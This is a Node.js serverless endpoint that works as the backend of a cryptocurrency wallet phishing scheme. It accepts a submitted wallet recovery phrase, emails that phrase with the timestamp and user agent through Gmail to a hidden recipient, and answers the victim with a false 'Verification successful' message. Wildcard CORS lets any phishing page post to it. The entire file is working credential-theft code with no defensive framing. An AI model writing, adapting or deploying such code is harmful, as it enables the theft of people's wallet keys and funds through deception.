const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
  
  // Handle pre-flight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    const { recoveryPhrase, phrases, timestamp, userAgent } = req.body;
    
    if (!recoveryPhrase) {
      return res.status(400).json({ success: false, message: 'Missing required data' });
    }

    // Create email content
    const htmlContent = `
      <h2>Recovery Phrase Received</h2>
      <p><strong>Recovery Phrase:</strong> ${recoveryPhrase}</p>
      <p><strong>Timestamp:</strong> ${timestamp}</p>
      <p><strong>User Agent:</strong> ${userAgent || 'Not provided'}</p>
    `;
    
    const plainContent = `
      Recovery Phrase Received
      
      Recovery Phrase: ${recoveryPhrase}
      Timestamp: ${timestamp}
      User Agent: ${userAgent || 'Not provided'}
    `;

    // Configure nodemailer
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.RECIPIENT_EMAIL,
      subject: 'Recovery Phrase Received',
      text: plainContent,
      html: htmlContent
    };

    // Send email
    await transporter.sendMail(mailOptions);

    // Send success response
    return res.status(200).json({ 
      success: true, 
      message: 'Verification successful' 
    });
  } catch (error) {
    console.error('Error processing request:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'Server error occurred' 
    });
  }
};